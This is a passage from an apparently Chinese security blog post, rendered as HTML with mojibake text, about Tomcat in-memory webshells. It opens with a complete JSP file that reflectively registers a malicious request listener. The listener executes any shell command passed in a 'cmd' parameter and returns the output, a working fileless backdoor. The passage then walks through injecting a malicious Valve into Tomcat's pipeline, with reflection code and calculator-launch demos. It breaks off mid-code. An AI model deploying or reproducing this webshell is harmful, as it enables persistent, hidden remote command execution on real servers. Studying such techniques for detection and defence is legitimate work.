</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">26
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">27
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">28
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">29
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">30
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">31
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">32
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">33
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">34
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">35
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">36
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">37
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">38
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">39
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">40
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">41
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">42
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">43
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">44
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">45
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">46
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">47
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">48
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">49
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">50
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">51
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">52
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.core.StandardContext&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;org.apache.catalina.connector.Request&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.lang.reflect.Field&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.util.Scanner&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@page import=&#34;javax.servlet.ServletRequestListener&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.io.InputStream&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page import=&#34;java.io.IOException&#34; %&gt;&lt;%--
</span></span><span style="display:flex;"><span>  Created by IntelliJ IDEA.
</span></span><span style="display:flex;"><span>  User: reus09
</span></span><span style="display:flex;"><span>  Date: 2023/4/15
</span></span><span style="display:flex;"><span>  Time: 21:12
</span></span><span style="display:flex;"><span>  To change this template use File | Settings | File Templates.
</span></span><span style="display:flex;"><span>--%&gt;
</span></span><span style="display:flex;"><span>&lt;%@ page contentType=&#34;text/html;charset=UTF-8&#34; language=&#34;java&#34; %&gt;
</span></span><span style="display:flex;"><span>&lt;%
</span></span><span style="display:flex;"><span>        Field requestField = request.getClass().getDeclaredField(&#34;request&#34;);
</span></span><span style="display:flex;"><span>        requestField.setAccessible(true);
</span></span><span style="display:flex;"><span>        final Request request1 = (Request) requestField.get(request);
</span></span><span style="display:flex;"><span>        StandardContext standardContext = (StandardContext) request1.getContext();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ServletRequestListener listener = new ServletRequestListener() {
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            public void requestInitialized(ServletRequestEvent sre) {
</span></span><span style="display:flex;"><span>                HttpServletRequest req = (HttpServletRequest) sre.getServletRequest();
</span></span><span style="display:flex;"><span>                HttpServletResponse resp = request1.getResponse();
</span></span><span style="display:flex;"><span>                if (req.getParameter(&#34;cmd&#34;) != null) {
</span></span><span style="display:flex;"><span>                    try {
</span></span><span style="display:flex;"><span>                        boolean isLinux = true;
</span></span><span style="display:flex;"><span>                        String osTyp = System.getProperty(&#34;os.name&#34;);
</span></span><span style="display:flex;"><span>                        if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&#34;win&#34;)) {
</span></span><span style="display:flex;"><span>                            isLinux = false;
</span></span><span style="display:flex;"><span>                        }
</span></span><span style="display:flex;"><span>                        String[] cmds = isLinux ? new String[]{&#34;sh&#34;, &#34;-c&#34;, req.getParameter(&#34;cmd&#34;)} : new String[]{&#34;cmd.exe&#34;, &#34;/c&#34;, req.getParameter(&#34;cmd&#34;)};
</span></span><span style="display:flex;"><span>                        InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
</span></span><span style="display:flex;"><span>                        Scanner s = new Scanner(in).useDelimiter(&#34;\\A&#34;);
</span></span><span style="display:flex;"><span>                        String out = s.hasNext() ? s.next() : &#34;&#34;;
</span></span><span style="display:flex;"><span>                        resp.getWriter().write(&#34;Listener Injection Success&#34; + out);
</span></span><span style="display:flex;"><span>                        resp.getWriter().flush();
</span></span><span style="display:flex;"><span>                    } catch (IOException ioe) {
</span></span><span style="display:flex;"><span>                        ioe.printStackTrace();
</span></span><span style="display:flex;"><span>                    }
</span></span><span style="display:flex;"><span>                }
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            @Override
</span></span><span style="display:flex;"><span>            public void requestDestroyed(ServletRequestEvent sre) {
</span></span><span style="display:flex;"><span>                System.out.println(&#34;1&#34;);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        };
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        standardContext.addApplicationEventListener(listener);
</span></span><span style="display:flex;"><span>%&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°<code>StandardContext</code>ä¸­å·²ç»æ·»åŠ äº†æˆ‘ä»¬çš„æ¶æ„Listenerã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416120438655.png" alt="image-20230416120438655"  />
</p>
<p>å½“æˆ‘ä»¬è®¿é—®å·²çŸ¥è·¯å¾„çš„èµ„æº + <code>?cmd=command</code>å³å¯å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230415212417738.png" alt="image-20230415212417738"  />
</p>
<h3 id="tomcat-valveå†…å­˜é©¬">Tomcat valveå†…å­˜é©¬<a hidden class="anchor" aria-hidden="true" href="#tomcat-valveå†…å­˜é©¬">#</a></h3>
<h4 id="åŸºç¡€çŸ¥è¯†-1">åŸºç¡€çŸ¥è¯†<a hidden class="anchor" aria-hidden="true" href="#åŸºç¡€çŸ¥è¯†-1">#</a></h4>
<p>Tomcat åœ¨å¤„ç†ä¸€ä¸ªè¯·æ±‚è°ƒç”¨é€»è¾‘æ—¶ï¼Œæ˜¯å¦‚ä½•å¤„ç†å’Œä¼ é€’ Request å’Œ Respone å¯¹è±¡çš„å‘¢ï¼Ÿ</p>
<p>ä¸ºäº†æ•´ä½“æ¶æ„çš„æ¯ä¸ªç»„ä»¶çš„å¯ä¼¸ç¼©æ€§å’Œå¯æ‰©å±•æ€§ï¼ŒTomcat ä½¿ç”¨äº†èŒè´£é“¾æ¨¡å¼æ¥å®ç°å®¢æˆ·ç«¯è¯·æ±‚çš„å¤„ç†ã€‚åœ¨ Tomcat ä¸­å®šä¹‰äº†ä¸¤ä¸ªæ¥å£ï¼šPipelineï¼ˆç®¡é“ï¼‰å’Œ Valveï¼ˆé˜€ï¼‰ã€‚è¿™ä¸¤ä¸ªæ¥å£åå­—å¾ˆå¥½çš„è¯ é‡Šäº†å¤„ç†æ¨¡å¼ï¼šæ•°æ®æµå°±åƒæ˜¯æµç»ç®¡é“çš„æ°´ä¸€æ ·ï¼Œç»è¿‡ç®¡é“ä¸Šä¸ªä¸€ä¸ªä¸ªé˜€é—¨ã€‚</p>
<p>Pipeline ä¸­ä¼šæœ‰ä¸€ä¸ªæœ€åŸºç¡€çš„ Valveï¼ˆbasicï¼‰ï¼Œå®ƒå§‹ç»ˆä½äºæœ«ç«¯ï¼ˆæœ€åæ‰§è¡Œï¼‰ï¼Œå°è£…äº†å…·ä½“çš„è¯·æ±‚å¤„ç†å’Œè¾“å‡ºå“åº”çš„è¿‡ç¨‹ã€‚Pipeline æä¾›äº† <code>addValve</code> æ–¹æ³•ï¼Œå¯ä»¥æ·»åŠ æ–° Valve åœ¨ basic ä¹‹å‰ï¼Œå¹¶æŒ‰ç…§æ·»åŠ é¡ºåºæ‰§è¡Œã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image1623645442719.jpg" alt="img"  />
</p>
<p>é¦–å…ˆç®€å•çœ‹ä¸€ä¸‹<code>org.apache.catalina.Pipeline</code>æ¥å£çš„å®šä¹‰</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416110628432.png" alt="image-20230416110628432"  />
</p>
<p><code>org.apache.catalina.Valve</code> çš„å®šä¹‰å¦‚ä¸‹ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416110740384.png" alt="image-20230416110740384"  />
</p>
<p>valveçš„invokeæ–¹æ³•å°†è¯·æ±‚ä¼ å…¥ä¸‹ä¸€ä¸ªvalveã€‚å¦‚æœä¸è°ƒç”¨ä¸‹ä¸€ä¸ªvalveçš„invokeï¼Œé‚£è¯·æ±‚åˆ°æ­¤ä¸­æ–­ã€‚</p>
<p>Tomcat æ¯ä¸ªå±‚çº§çš„å®¹å™¨ï¼ˆEngineã€Hostã€Contextã€Wrapperï¼‰ï¼Œéƒ½æœ‰åŸºç¡€çš„ Valve å®ç°ï¼ˆStandardEngineValveã€StandardHostValveã€StandardContextValveã€StandardWrapperValveï¼‰ã€‚</p>
<p>åœ¨servletè°ƒè¯•æ—¶ä¹Ÿèƒ½çœ‹åˆ°ä¾æ¬¡è°ƒç”¨valveçš„è¿‡ç¨‹ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416112059770.png" alt="image-20230416112059770"  />
</p>
<p><code>Valve</code>å­˜æ”¾çš„æ–¹å¼å¹¶éç»Ÿä¸€å­˜æ”¾åœ¨<code>Pipeline</code>ä¸­ï¼Œè€Œæ˜¯åƒä¸€ä¸ªé“¾è¡¨ä¸€ä¸ªæ¥ç€ä¸€ä¸ªã€‚</p>
<p>è°ƒç”¨<code>getNext()</code>æ–¹æ³•å³å¯è·å–åœ¨è¿™ä¸ª<code>Pipeline</code>ä¸Šçš„ä¸‹ä¸ª<code>Valve</code>å®ä¾‹</p>
<p>ä¸€èˆ¬ä½¿ç”¨å®ç°äº†valveæ¥å£çš„ValveBaseç±»ï¼š</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416112404603.png" alt="image-20230416112404603"  />
</p>
<h4 id="valveçš„ç”Ÿæˆå’Œé…ç½®">valveçš„ç”Ÿæˆå’Œé…ç½®<a hidden class="anchor" aria-hidden="true" href="#valveçš„ç”Ÿæˆå’Œé…ç½®">#</a></h4>
<h5 id="æ–°å»ºvalve">æ–°å»ºvalve<a hidden class="anchor" aria-hidden="true" href="#æ–°å»ºvalve">#</a></h5>
<p>æ–°å»ºvalveåªéœ€è¦ç»§æ‰¿ValveBaseç±»å¹¶å®ç°invokeæ–¹æ³•ï¼Œpipelineç®¡é“ä¼šä¾æ¬¡æ‰§è¡Œvalveçš„invoke</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">class</span> EvilValve <span style="color:#fff;font-weight:bold">extends</span> ValveBase{
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> invoke(Request request, Response response) {
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span>{
</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(<span style="color:#0ff;font-weight:bold">&#34;calc&#34;</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#fff;font-weight:bold">this</span>.<span style="color:#007f7f">getNext</span>().<span style="color:#007f7f">invoke</span>(request, response);
</span></span><span style="display:flex;"><span>        }<span style="color:#fff;font-weight:bold">catch</span> (Exception e){
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="æ³¨å†Œvalve">æ³¨å†Œvalve<a hidden class="anchor" aria-hidden="true" href="#æ³¨å†Œvalve">#</a></h5>
<p>Tomcat ä¸­ Pipeline ä»…æœ‰ä¸€ä¸ªå®ç°ç±»<code> StandardPipeline</code>,å­˜æ”¾åœ¨ ContainerBase çš„ pipeline å±æ€§ä¸­,å¹¶ä¸” ContainerBase æä¾› <code>addValve</code> æ–¹æ³•è°ƒç”¨ StandardPipeline çš„ addValve æ–¹æ³•æ·»åŠ ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416111345723.png" alt="image-20230416111345723"  />
</p>
<p><code>StandardPipeline</code> æ ‡å‡†ç±»ä¸­çš„<code>addvalve</code>æ–¹æ³•</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416111543398.png" alt="image-20230416111543398"  />
</p>
<p>Tomcat ä¸­å››ä¸ªå±‚çº§çš„å®¹å™¨éƒ½ç»§æ‰¿äº† ContainerBase ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒä»¬åŒæ—¶ç»´æŠ¤äº†è¿™ä¸ª Pipeline å®ä¾‹ï¼ˆStandardPipelineï¼‰ï¼Œæ‰€ä»¥åœ¨å“ªä¸ªå±‚çº§çš„å®¹å™¨çš„æ ‡å‡†å®ç°ä¸Šè°ƒç”¨<code>addvalve</code>æ·»åŠ è‡ªå®šä¹‰çš„ Valve éƒ½å¯ä»¥ã€‚</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416111640603.png" alt="image-20230416111640603"  />
</p>
<h5 id="è°ƒç”¨valve">è°ƒç”¨valve<a hidden class="anchor" aria-hidden="true" href="#è°ƒç”¨valve">#</a></h5>
<p>åœ¨<code>CoyoteAdapter.service()</code>è·å–äº†Pipelineçš„ç¬¬ä¸€ä¸ªValveï¼Œå¹¶ä¸”è°ƒç”¨äº†invoke,å¹¶ä¸”ç¬¬ä¸€ä¸ªvalveå°±æ˜¯<code>StandardEnginevalve</code></p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416113223706.png" alt="image-20230416113223706"  />
</p>
<p>è·Ÿè¿›åˆ°<code>StandardEngineValve#invoke</code>ï¼Œå¯ä»¥çœ‹åˆ°è°ƒç”¨äº†ä¸‹ä¸€ä¸ªinvoke</p>
<p><img loading="lazy" src="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/imageimage-20230416113515196.png" alt="image-20230416113515196"  />
</p>
<h4 id="åˆ©ç”¨è¿‡ç¨‹-3">åˆ©ç”¨è¿‡ç¨‹<a hidden class="anchor" aria-hidden="true" href="#åˆ©ç”¨è¿‡ç¨‹-3">#</a></h4>
<p>æ ¹æ®valveçš„ç”Ÿæˆå’Œé…ç½®ï¼Œæ¨¡æ‹Ÿæ³¨å†Œæ¶æ„valveï¼š</p>
<ol>
<li>è·å–context</li>
<li>ä»StandardContextåå°„è·å–StandardPipeline</li>
<li>è°ƒç”¨addValveæ·»åŠ æ¶æ„Valve</li>
</ol>
<h5 id="è·å–context-2">è·å–context<a hidden class="anchor" aria-hidden="true" href="#è·å–context-2">#</a></h5>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Field requestField = request.<span style="color:#007f7f">getClass</span>().<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;request&#34;</span>);
</span></span><span style="display:flex;"><span>requestField.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">final</span> Request request1 = (Request) requestField.<span style="color:#007f7f">get</span>(request);
</span></span><span style="display:flex;"><span>StandardContext standardContext = (StandardContext) request1.<span style="color:#007f7f">getContext</span>();
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="åå°„è·å–standardpipeline">åå°„è·å–StandardPipeline<a hidden class="anchor" aria-hidden="true" href="#åå°„è·å–standardpipeline">#</a></h5>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>Field pipeline = ContainerBase.<span style="color:#007f7f">class</span>.<span style="color:#007f7f">getDeclaredField</span>(<span style="color:#0ff;font-weight:bold">&#34;pipeline&#34;</span>);
</span></span><span style="display:flex;"><span>pipeline.<span style="color:#007f7f">setAccessible</span>(<span style="color:#fff;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>StandardPipeline standardPipeline = (StandardPipeline) pipeline.<span style="color:#007f7f">get</span>(standardContext);
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardpipeline">åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardPipeline<a hidden class="anchor" aria-hidden="true" href="#åˆ›å»ºæ³¨å†Œæ¶æ„valveå¹¶æ·»åŠ è¿›standardpipeline">#</a></h5>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>ValveBase valveBase = <span style="color:#fff;font-weight:bold">new</span> ValveBase() {
</span></span><span style="display:flex;"><span>    @Override
</span></span><span style="display:flex;"><span>    <span style="color:#fff;font-weight:bold">public</span> <span style="color:#fff;font-weight:bold">void</span> invoke(Request request, Response response){
</span></span><span style="display:flex;"><span>        <span style="color:#fff;font-weight:bold">try</span> {
</span></span><span style="display:flex;"><span>            Runtime.<span style="color:#007f7f">getRuntime</span>().<span style="color:#007f7f">exec</span>(<span style="color:#0ff;font-weight:bold">&#34;open -a Calculator.app&#34;</span>);
</span></span><span style="display:flex;"><span>        } <span style="color:#fff;font-weight:bold">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>            e.<span style="color:#007f7f">printStackTrace</span>();
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>};
</span></span><span style="display:flex;"><span><span style="color:#007f7f">// è°ƒç”¨addvalve æ–¹æ³•æ·»åŠ åˆ°pipelineä¸­
</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>standardPipeline.<span style="color:#007f7f">addValve</span>(valveBase);
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸ºäº†ä½¿æ­£å¸¸invokeèƒ½è¿›è¡Œä¸‹å»ï¼Œæ¶æ„valveä¹Ÿåº”è¯¥è°ƒç”¨ä¸‹ä¸€ä¸ªvalve.invoke</p>
<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
